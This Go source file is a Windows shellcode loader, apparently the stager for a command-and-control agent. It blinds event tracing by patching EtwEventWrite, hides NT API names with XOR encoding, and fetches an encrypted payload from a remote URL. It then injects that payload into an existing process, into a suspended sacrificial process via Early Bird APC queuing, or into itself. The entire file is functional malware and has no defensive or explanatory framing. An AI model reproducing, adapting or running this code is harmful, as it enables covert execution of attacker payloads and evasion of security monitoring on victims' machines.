//go:build windows

package main

import (
	"bytes"
	"compress/zlib"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── Constants ─────────────────────────────────────────────────────────────────

const (
	processCreateThread = 0x0002
	processVMOp         = 0x0008
	processVMWrite      = 0x0020
	memCommitReserve    = 0x3000
	pageRW              = 0x04
	pageRX              = 0x20
	createSuspended     = 0x00000004
	createNoWindow      = 0x08000000
)

// ── Obfuscated ntdll/kernel32 name fragments (garble encrypts literals further) ─

// deobf XORs a byte slice with k and returns the string.
// Keeps sensitive API names off static string tables in non-garble builds.
func deobf(b []byte, k byte) string {
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ k
	}
	return string(out)
}

const strKey = byte(0x5A)

// API name byte arrays — each string XOR'd with strKey=0x5A.
// Garble -literals adds a second obfuscation pass over these constants.
var bNtdll    = []byte{0x34,0x2e,0x3e,0x36,0x36,0x74,0x3e,0x36,0x36}                                                                                                              // "ntdll.dll"
var bEtwWrite = []byte{0x1f,0x2e,0x2d,0x1f,0x2c,0x3f,0x34,0x2e,0x0d,0x28,0x33,0x2e,0x3f}                                                                                         // "EtwEventWrite"
var bNtAlloc  = []byte{0x14,0x2e,0x1b,0x36,0x36,0x35,0x39,0x3b,0x2e,0x3f,0x0c,0x33,0x28,0x2e,0x2f,0x3b,0x36,0x17,0x3f,0x37,0x35,0x28,0x23}                                      // "NtAllocateVirtualMemory"
var bNtProt   = []byte{0x14,0x2e,0x0a,0x28,0x35,0x2e,0x3f,0x39,0x2e,0x0c,0x33,0x28,0x2e,0x2f,0x3b,0x36,0x17,0x3f,0x37,0x35,0x28,0x23}                                           // "NtProtectVirtualMemory"
var bNtWrite  = []byte{0x14,0x2e,0x0d,0x28,0x33,0x2e,0x3f,0x0c,0x33,0x28,0x2e,0x2f,0x3b,0x36,0x17,0x3f,0x37,0x35,0x28,0x23}                                                     // "NtWriteVirtualMemory"
var bNtOpen   = []byte{0x14,0x2e,0x15,0x2a,0x3f,0x34,0x0a,0x28,0x35,0x39,0x3f,0x29,0x29}                                                                                         // "NtOpenProcess"
var bNtClose  = []byte{0x14,0x2e,0x19,0x36,0x35,0x29,0x3f}                                                                                                                        // "NtClose"
var bRtlSpawn = []byte{0x08,0x2e,0x36,0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0f,0x29,0x3f,0x28,0x0e,0x32,0x28,0x3f,0x3b,0x3e}                                                         // "RtlCreateUserThread"
var bNtWait   = []byte{0x14,0x2e,0x0d,0x3b,0x33,0x2e,0x1c,0x35,0x28,0x09,0x33,0x34,0x3d,0x36,0x3f,0x15,0x38,0x30,0x3f,0x39,0x2e}                                               // "NtWaitForSingleObject"

// ── NtOpenProcess structs ─────────────────────────────────────────────────────

type objectAttributes struct {
	Length                   uint32
	Pad0                     uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	Pad1                     uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

// ── Entry point ───────────────────────────────────────────────────────────────

func run() {
	patchETW()

	sc := fetch()
	if len(sc) == 0 {
		return
	}
	sc = decompress(sc)
	if len(sc) == 0 {
		return
	}

	// 1. Try injecting into an already-running process
	if InjectExisting != "" {
		if pid := findPID(InjectExisting); pid != 0 {
			if injectPID(pid, sc) == nil {
				return
			}
		}
	}

	// 2. Spawn sacrificial process and inject
	if SacrificialProc != "" {
		if spawnAndInject(sc) == nil {
			return
		}
	}

	// 3. Self-inject fallback
	execSelf(sc)
}

// ── Download ──────────────────────────────────────────────────────────────────

func fetch() []byte {
	u, err := url.Parse(PayloadURL)
	if err != nil || u.Host == "" {
		return nil
	}

	isHTTPS := u.Scheme == "https"
	port := u.Port()
	if port == "" {
		if isHTTPS {
			port = "443"
		} else {
			port = "80"
		}
	}
	targetAddr := u.Hostname() + ":" + port

	// Establish TCP connection — either direct or through an HTTP CONNECT proxy.
	var tcpConn net.Conn
	if ProxyURL != "" {
		pu, perr := url.Parse(ProxyURL)
		if perr != nil || pu.Host == "" {
			return nil
		}
		proxyAddr := pu.Host
		if pu.Port() == "" {
			proxyAddr += ":8080"
		}
		tcpConn, err = net.Dial("tcp", proxyAddr)
		if err != nil {
			return nil
		}
		// Issue HTTP CONNECT to tunnel through the proxy.
		fmt.Fprintf(tcpConn, "CONNECT %s HTTP/1.0\r\nHost: %s\r\n\r\n", targetAddr, targetAddr)
		// Read proxy response — must be "200 Connection established".
		var resp bytes.Buffer
		tmp := make([]byte, 1)
		for {
			n, rerr := tcpConn.Read(tmp)
			if n > 0 {
				resp.Write(tmp[:n])
				b := resp.Bytes()
				if len(b) >= 4 && bytes.Equal(b[len(b)-4:], []byte("\r\n\r\n")) {
					break
				}
			}
			if rerr != nil {
				tcpConn.Close()
				return nil
			}
		}
		if !bytes.Contains(resp.Bytes(), []byte("200")) {
			tcpConn.Close()
			return nil
		}
	} else {
		tcpConn, err = net.Dial("tcp", targetAddr)
		if err != nil {
			return nil
		}
	}

	// Wrap with TLS if the URL scheme is https://.
	var conn io.ReadWriter
	if isHTTPS {
		tlsCfg := &tls.Config{
			ServerName:         u.Hostname(),
			InsecureSkipVerify: TLSSkipVerify == "true", //nolint:gosec
		}
		tlsConn := tls.Client(tcpConn, tlsCfg)
		if err := tlsConn.Handshake(); err != nil {
			tcpConn.Close()
			return nil
		}
		conn = tlsConn
		defer tlsConn.Close()
	} else {
		conn = tcpConn
		defer tcpConn.Close()
	}

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	fmt.Fprintf(conn, "GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n",
		path, u.Host, UserAgent)

	var buf bytes.Buffer
	io.Copy(&buf, conn) //nolint:errcheck

	raw := buf.Bytes()
	sep := bytes.Index(raw, []byte("\r\n\r\n"))
	if sep < 0 {
		return nil
	}
	body := raw[sep+4:]
	if len(body) == 0 {
		return nil
	}

	// XOR decrypt
	if key, err := hex.DecodeString(XORKey); err == nil && len(key) > 0 {
		for i := range body {
			body[i] ^= key[i%len(key)]
		}
	}
	return body
}

// ── Decompress (zlib) ─────────────────────────────────────────────────────────

func decompress(data []byte) []byte {
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return data // not compressed — pass through
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		return data
	}
	return out
}

// ── ETW blind ─────────────────────────────────────────────────────────────────

func patchETW() {
	ntdll := windows.NewLazySystemDLL(deobf(bNtdll, strKey))
	proc := ntdll.NewProc(deobf(bEtwWrite, strKey))
	if proc.Find() != nil {
		return
	}
	addr := proc.Addr()
	patch := []byte{0x48, 0x31, 0xC0, 0xC3} // xor rax,rax; ret
	var old uint32
	windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)
	windows.VirtualProtect(addr, uintptr(len(patch)), old, &old)
}

// ── Process enumeration ───────────────────────────────────────────────────────

func findPID(name string) uint32 {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	for err = windows.Process32First(snap, &pe); err == nil; err = windows.Process32Next(snap, &pe) {
		if strings.EqualFold(windows.UTF16ToString(pe.ExeFile[:]), name) {
			return pe.ProcessID
		}
	}
	return 0
}

// ── Remote injection into existing process ────────────────────────────────────

func injectPID(pid uint32, sc []byte) error {
	ntdll := windows.NewLazySystemDLL(deobf(bNtdll, strKey))
	ntOpen  := ntdll.NewProc(deobf(bNtOpen, strKey))
	ntAlloc := ntdll.NewProc(deobf(bNtAlloc, strKey))
	ntWrite := ntdll.NewProc(deobf(bNtWrite, strKey))
	ntProt  := ntdll.NewProc(deobf(bNtProt, strKey))
	rtlSpawn := ntdll.NewProc(deobf(bRtlSpawn, strKey))
	ntClose := ntdll.NewProc(deobf(bNtClose, strKey))

	oa := objectAttributes{Length: 48}
	cid := clientID{UniqueProcess: uintptr(pid)}

	var hProc uintptr
	ret, _, _ := ntOpen.Call(
		uintptr(unsafe.Pointer(&hProc)),
		processCreateThread|processVMOp|processVMWrite,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	if ret != 0 || hProc == 0 {
		return fmt.Errorf("NtOpenProcess: %x", ret)
	}
	defer ntClose.Call(hProc)

	return injectHandle(hProc, sc, ntAlloc, ntWrite, ntProt, rtlSpawn, ntClose)
}

// ── Spawn sacrificial process + inject ───────────────────────────────────────

func spawnAndInject(sc []byte) error {
	ntdll   := windows.NewLazySystemDLL(deobf(bNtdll, strKey))
	ntAlloc := ntdll.NewProc(deobf(bNtAlloc, strKey))
	ntWrite := ntdll.NewProc(deobf(bNtWrite, strKey))
	ntProt  := ntdll.NewProc(deobf(bNtProt, strKey))
	ntClose := ntdll.NewProc(deobf(bNtClose, strKey))
	// QueueUserAPC via kernel32 for Early Bird pattern
	k32     := windows.NewLazySystemDLL("kernel32.dll")
	queueAPC := k32.NewProc("QueueUserAPC")

	target, _ := windows.UTF16PtrFromString(SacrificialProc)
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// Spawn suspended — ntdll is mapped but user code hasn't run yet.
	if err := windows.CreateProcess(
		target, nil, nil, nil, false,
		createSuspended|createNoWindow,
		nil, nil, &si, &pi,
	); err != nil {
		return err
	}

	// Allocate RW, write shellcode, flip to RX in the target process
	var base uintptr
	size := uintptr(len(sc))
	ntAlloc.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&size)), memCommitReserve, pageRW)
	if base == 0 {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return fmt.Errorf("alloc failed")
	}

	var written uintptr
	ntWrite.Call(uintptr(pi.Process), base, uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)), uintptr(unsafe.Pointer(&written)))

	var old uint32
	size = uintptr(len(sc))
	ntProt.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&size)), pageRX, uintptr(unsafe.Pointer(&old)))

	// Queue shellcode as APC on main thread.
	// ntdll calls NtTestAlert() early in init which drains the APC queue —
	// our shellcode fires before any user-mode initialization code runs.
	queueAPC.Call(base, uintptr(pi.Thread), 0)

	// Resume — APC fires immediately in ntdll's init path
	windows.ResumeThread(pi.Thread)

	ntClose.Call(uintptr(pi.Thread))
	ntClose.Call(uintptr(pi.Process))
	return nil
}

// injectHandle allocates shellcode in hProc, makes it RX, and spawns a thread.
func injectHandle(
	hProc uintptr,
	sc []byte,
	ntAlloc, ntWrite, ntProt, rtlSpawn, ntClose *windows.LazyProc,
) error {
	var base uintptr
	size := uintptr(len(sc))

	ntAlloc.Call(hProc, uintptr(unsafe.Pointer(&base)), 0, uintptr(unsafe.Pointer(&size)), memCommitReserve, pageRW)
	if base == 0 {
		return fmt.Errorf("alloc failed")
	}

	var written uintptr
	ntWrite.Call(hProc, base, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&written)))

	var old uint32
	size = uintptr(len(sc))
	ntProt.Call(hProc, uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&size)), pageRX, uintptr(unsafe.Pointer(&old)))

	var th uintptr
	rtlSpawn.Call(hProc, 0, 0, 0, 0, 0, base, 0, uintptr(unsafe.Pointer(&th)), 0)
	if th != 0 {
		ntClose.Call(th) // detach — loader exits, shellcode thread runs independently
	}
	return nil
}

// ── Self-inject fallback ──────────────────────────────────────────────────────

func execSelf(sc []byte) {
	ntdll    := windows.NewLazySystemDLL(deobf(bNtdll, strKey))
	ntAlloc  := ntdll.NewProc(deobf(bNtAlloc, strKey))
	ntProt   := ntdll.NewProc(deobf(bNtProt, strKey))
	rtlSpawn := ntdll.NewProc(deobf(bRtlSpawn, strKey))
	ntWait   := ntdll.NewProc(deobf(bNtWait, strKey))

	var base uintptr
	size := uintptr(len(sc))
	ntAlloc.Call(^uintptr(0), uintptr(unsafe.Pointer(&base)), 0, uintptr(unsafe.Pointer(&size)), memCommitReserve, pageRW)
	if base == 0 {
		return
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(base)), len(sc)), sc)

	var old uint32
	size = uintptr(len(sc))
	ntProt.Call(^uintptr(0), uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&size)), pageRX, uintptr(unsafe.Pointer(&old)))

	var th uintptr
	rtlSpawn.Call(^uintptr(0), 0, 0, 0, 0, 0, base, 0, uintptr(unsafe.Pointer(&th)), 0)
	if th != 0 {
		ntWait.Call(th, 0, 0) // block until shellcode exits (agent beacon loop)
	}
}
